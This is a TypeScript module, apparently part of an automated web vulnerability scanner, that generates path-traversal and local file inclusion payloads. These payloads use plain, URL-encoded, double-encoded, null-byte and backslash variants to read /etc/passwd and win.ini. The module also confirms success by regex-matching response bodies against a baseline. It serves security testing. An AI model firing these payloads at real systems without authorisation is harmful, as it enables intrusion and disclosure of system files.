// Path-traversal / local file inclusion oracle for the exploration layer
// (explore.lfi). Generic: a candidate parameter is made to read a well-known
// system file through several standard traversal encodings, and the proof is the
// FILE'S OWN unmistakable content in the response — not a target signature. A
// parameter that ignores the payload, or a WAF that blocks it, never matches.

/** Standard traversal payloads for a known file, in the usual evasions. */
export function traversalPayloads(): { payload: string; marker: RegExp; what: string }[] {
  // A COMPLETE /etc/passwd root entry (7 colon fields ending in a shell path),
  // not just the "root:...:0:0:" fragment which can appear in unrelated text.
  const unix = /(^|\n)root:[^:\n]*:0:0:[^:\n]*:[^:\n]*:\/[^\n]*/;
  // win.ini: the 16-bit comment, or two distinct sections together (one marker alone is too generic).
  const win = /(; for 16-bit app support|\[fonts\][\s\S]{0,600}\[extensions\]|\[extensions\][\s\S]{0,600}\[fonts\])/i;
  const depths = ["../".repeat(8), "..%2f".repeat(8), "....//".repeat(8), "..%252f".repeat(8)];
  const out: { payload: string; marker: RegExp; what: string }[] = [];
  for (const d of depths) {
    out.push({ payload: `${d}etc/passwd`, marker: unix, what: "/etc/passwd" });
    out.push({ payload: `${d}etc/passwd%00`, marker: unix, what: "/etc/passwd (null byte)" });
  }
  out.push({ payload: "/etc/passwd", marker: unix, what: "/etc/passwd (absolute)" });
  for (const d of ["..\\".repeat(8), "..%5c".repeat(8)]) out.push({ payload: `${d}windows\\win.ini`, marker: win, what: "windows\\win.ini" });
  return out;
}

/** Proven iff the response carries the target file's own content. Pure, testable. */
export function lfiOracle(input: { body: string; marker: RegExp; baseline?: string }): { verdict: "proven" | "lead"; reason: string } {
  if (!input.marker.test(input.body)) return { verdict: "lead", reason: "no system-file content in the response" };
  // Negative control: the file content must be NEW, not already in the baseline page.
  if (input.baseline && input.marker.test(input.baseline)) return { verdict: "lead", reason: "the marker is already in the baseline response: not caused by the traversal" };
  return { verdict: "proven", reason: "the response returned a system file's own content (absent from the baseline)" };
}
